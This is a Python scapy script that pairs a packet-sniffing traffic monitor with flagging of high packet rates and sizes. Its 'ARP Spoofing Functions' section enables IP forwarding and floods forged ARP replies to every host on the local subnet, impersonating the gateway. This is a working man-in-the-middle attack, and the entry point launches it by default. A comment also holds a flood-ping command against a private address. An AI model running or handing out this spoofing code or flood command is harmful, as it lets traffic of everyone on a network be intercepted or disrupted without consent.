from scapy.all import sniff, IP, TCP, UDP, ICMP, ARP, send, get_if_hwaddr, get_if_addr, conf
from collections import defaultdict, deque
import threading
import time
import os

class NetworkMonitor:
    def __init__(self):
        self.traffic_data = defaultdict(lambda: {"packets": 0, "bytes": 0, "timestamps": deque(maxlen=100)})
        self.traffic_log = deque(maxlen=1000)
        self.lock = threading.Lock()
        self.high_packet_count_threshold = 100
        self.high_packet_size_threshold = 1000
        self.dos_packet_rate_threshold = 50

    def analyze_packet(self, packet):
        if not (ARP in packet or IP in packet):
            return

        pkt_len = len(packet)
        timestamp = time.time()
        is_malicious = False
        malicious_reason = ""

        if ARP in packet:
            proto = "ARP"
            src = packet[ARP].psrc
            dst = packet[ARP].pdst
            port = "-"
            key = (src, dst, proto, port)
            ttl = "-"
        else:
            src = packet[IP].src
            dst = packet[IP].dst
            ip_proto = packet[IP].proto
            ttl = getattr(packet[IP], 'ttl', '-')
            port = "-"

            if ip_proto == 1 and ICMP in packet:
                proto = "ICMP"
                icmp_type = packet[ICMP].type
                icmp_code = packet[ICMP].code
                port = f"{icmp_type}.{icmp_code}"
            elif TCP in packet:
                dport = packet[TCP].dport
                proto_map = {
                    443: "HTTPS", 80: "HTTP", 22: "SSH", 53: "DNS",
                    21: "FTP", 25: "SMTP", 110: "POP3", 143: "IMAP",
                    3389: "RDP", 8080: "HTTP-ALT", 3306: "MYSQL", 6379: "REDIS",
                    27017: "MONGODB",
                }
                proto = proto_map.get(dport, "TCP")
                port = str(dport)
            elif UDP in packet:
                dport = packet[UDP].dport
                udp_port_map = {
                    53: "DNS", 123: "NTP", 67: "DHCP", 68: "DHCP",
                    69: "TFTP", 161: "SNMP"
                }
                proto = udp_port_map.get(dport, "UDP")
                port = str(dport)
            else:
                proto_names = {
                    2: "IGMP", 6: "TCP", 17: "UDP", 41: "IPv6",
                    47: "GRE", 50: "ESP", 51: "AH"
                }
                proto = proto_names.get(ip_proto, f"IP-Proto-{ip_proto}")
                port = "-"
            key = (src, dst, proto, port)

        with self.lock:
            data = self.traffic_data[key]
            data["packets"] += 1
            data["bytes"] += pkt_len
            data["timestamps"].append(timestamp)

            recent_packets = [t for t in data["timestamps"] if t > timestamp - 10]
            if len(recent_packets) > self.dos_packet_rate_threshold:
                is_malicious = True
                malicious_reason = f"High packet rate: {len(recent_packets)} packets in 10s"
            if pkt_len > self.high_packet_size_threshold:
                is_malicious = True
                malicious_reason = f"{malicious_reason}; Large packet size" if malicious_reason else "Large packet size"
            if data["packets"] > self.high_packet_count_threshold:
                is_malicious = True
                malicious_reason = f"{malicious_reason}; High packet count" if malicious_reason else "High packet count"

            self.traffic_log.append({
                "timestamp": timestamp,
                "source_ip": src,
                "dest_ip": dst,
                "protocol": proto,
                "port": port,
                "packets": 1,
                "bytes": pkt_len,
                "ttl": ttl,
                "status": "High" if pkt_len > 1000 else "Normal",
                "action": "Logged",
                "is_malicious": is_malicious,
                "malicious_reason": malicious_reason,
            })

    def start_sniffing(self):
        print("Starting packet capture... (Ctrl+C to stop)")
        sniff(prn=self.analyze_packet, store=0, filter="ip or arp")

    def start(self):
        thread = threading.Thread(target=self.start_sniffing, daemon=True)
        thread.start()

    def get_stats(self):
        with self.lock:
            stats = [
                {
                    "source_ip": src,
                    "dest_ip": dst,
                    "protocol": proto,
                    "port": port,
                    "packets": data["packets"],
                    "bytes": data["bytes"],
                    "ttl": "-",
                    "status": "High" if data["packets"] > 100 else "Normal",
                    "action": "Logged",
                    "is_malicious": len([t for t in data["timestamps"] if t > time.time() - 10]) > self.dos_packet_rate_threshold,
                    "malicious_reason": "High packet rate" if
                        len([t for t in data["timestamps"] if t > time.time() - 10]) > self.dos_packet_rate_threshold else ""
                }
                for (src, dst, proto, port), data in self.traffic_data.items()
            ]
        return sorted(stats, key=lambda x: x["packets"], reverse=True)

    def filter_by_protocol(self, protocol: str):
        protocol = protocol.upper()
        with self.lock:
            filtered = [
                {
                    "source_ip": src,
                    "dest_ip": dst,
                    "protocol": proto,
                    "port": port,
                    "packets": data["packets"],
                    "bytes": data["bytes"],
                }
                for (src, dst, proto, port), data in self.traffic_data.items()
                if protocol == proto.upper()
            ]
        return sorted(filtered, key=lambda x: x["packets"], reverse=True)

# ======================
#sudo ping -f -s 1000 192.168.100.11

# ARP Spoofing Functions
# ======================

def enable_ip_forwarding():
    if os.name == "posix":
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
            print("[✓] IP forwarding enabled.")
        except Exception as e:
            print(f"[!] Failed to enable IP forwarding: {e}")

def arp_spoof_all_devices(interface="eth0", interval=5):
    local_ip = get_if_addr(interface)
    local_mac = get_if_hwaddr(interface)
    gateway_ip = conf.route.route("0.0.0.0")[2]

    base_ip = '.'.join(local_ip.split('.')[:-1])
    print(f"[ARP Spoofing] Claiming to be gateway {gateway_ip} from {local_mac}")

    while True:
        for i in range(1, 255):
            target_ip = f"{base_ip}.{i}"
            if target_ip in [local_ip, gateway_ip]:
                continue
            arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=local_mac)
            send(arp_response, verbose=False)
        time.sleep(interval)

# ======================
# Entry Point
# ======================

if __name__ == "__main__":
    nm = NetworkMonitor()
    nm.start()

    enable_ip_forwarding()  # optional but useful
    spoof_thread = threading.Thread(target=arp_spoof_all_devices, args=("eth0",), daemon=True)
    spoof_thread.start()

    print("Network monitor and ARP spoofing started...")

    try:
        while True:
            time.sleep(10)
            stats = nm.get_stats()
            print("\nTop traffic stats:")
            for stat in stats[:10]:
                mal_flag = "!!MALICIOUS!!" if stat.get("is_malicious") else ""
                reason = stat.get("malicious_reason", "")
                print(f"{stat['source_ip']} -> {stat['dest_ip']} | {stat['protocol']}:{stat['port']} "
                      f"Packets: {stat['packets']} Bytes: {stat['bytes']} {mal_flag} {reason}")
    except KeyboardInterrupt:
        print("Stopping...")
